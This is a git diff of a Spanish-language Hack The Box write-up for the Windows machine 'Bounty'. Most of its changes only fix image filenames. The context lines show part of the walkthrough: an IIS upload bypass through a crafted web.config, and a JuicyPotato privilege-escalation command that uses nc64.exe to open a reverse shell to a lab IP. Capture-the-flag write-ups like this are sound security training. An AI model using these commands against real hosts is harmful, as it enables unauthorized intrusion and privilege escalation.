@@ -3,7 +3,7 @@ title: "Bounty - WriteUp"
 date: Sat Jan 04 2025 08:00:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, dirb, reverse-shell, wfuzz, windows, iis, powershell, dirbuster]
-image: /assets/img/htb-writeups/Pasted image 20240216140240.png
+image: /assets/img/htb-writeups/Pasted-image-20240216140240.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20240216140240.png
   platform="HTB"
 %}
 
-![Bounty](/assets/img/htb-writeups/Pasted image 20240216140240.png)
+![Bounty](/assets/img/htb-writeups/Pasted-image-20240216140240.png)
 
 ---
 
@@ -22,7 +22,7 @@ Tags:
 
 -----
 
-![BOUNTY](/assets/img/htb-writeups/Pasted image 20240216140240.png)
+![BOUNTY](/assets/img/htb-writeups/Pasted-image-20240216140240.png)
 
 Bounty es una máquina de dificultad fácil a media, que presenta una técnica interesante para evitar las protecciones del cargador de archivos y lograr la ejecución de código. Esta máquina también destaca la importancia de mantener los sistemas actualizados con los últimos parches de seguridad.
 
@@ -71,15 +71,15 @@ ID           Response   Lines    Word       Chars       Payload                 
 
 Vamos a la ruta que hemos encontrado.
 
-![BOUNTY](/assets/img/htb-writeups/Pasted image 20240216142159.png)
+![BOUNTY](/assets/img/htb-writeups/Pasted-image-20240216142159.png)
 
 Podemos subir archivos. Vamos a hacer pruebas.
 
-![BOUNTY](/assets/img/htb-writeups/Pasted image 20240216143221.png)
+![BOUNTY](/assets/img/htb-writeups/Pasted-image-20240216143221.png)
 
 Vamos a la ruta y vemos que la imagen está subida:
 
-![BOUNTY](/assets/img/htb-writeups/Pasted image 20240216143256.png)
+![BOUNTY](/assets/img/htb-writeups/Pasted-image-20240216143256.png)
 
 Vamos a investigar cómo subirle un archivo malicioso y se lo coma.
 
@@ -139,7 +139,7 @@ if __name__ == "__main__":
     f.close()
 ```
 
-![BOUNTY](/assets/img/htb-writeups/Pasted image 20240216173559.png)
+![BOUNTY](/assets/img/htb-writeups/Pasted-image-20240216173559.png)
 
 Bien, podemos subir un .config al IIS. 
 
@@ -196,13 +196,13 @@ GUARDAMOS.
 
 Lo subimos y vamos a la página: http://10.129.58.173/uploadedfiles/web.config
 
-![BOUNTY](/assets/img/htb-writeups/Pasted image 20240216193307.png)
+![BOUNTY](/assets/img/htb-writeups/Pasted-image-20240216193307.png)
 
 Y estamos dentro!
 
 Si hacemos un whoami /all vemos que tenemos el permisos de SeImpersonate:
 
-![BOUNTY](/assets/img/htb-writeups/Pasted image 20240216193452.png)
+![BOUNTY](/assets/img/htb-writeups/Pasted-image-20240216193452.png)
 
 Ahora lo único que nos hace falta es subir JuicyPotato y escalaremos privilegios:
 
@@ -217,7 +217,7 @@ Nos ponemos a la escucha y ejecutamos el potato:
 > .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\temp\nc64.exe -e cmd 10.10.14.50 4444"
 ```
 
-![BOUNTY](/assets/img/htb-writeups/Pasted image 20240216202838.png)
+![BOUNTY](/assets/img/htb-writeups/Pasted-image-20240216202838.png)
 ---
 
 **Última actualización**: 2025-01-04<br>
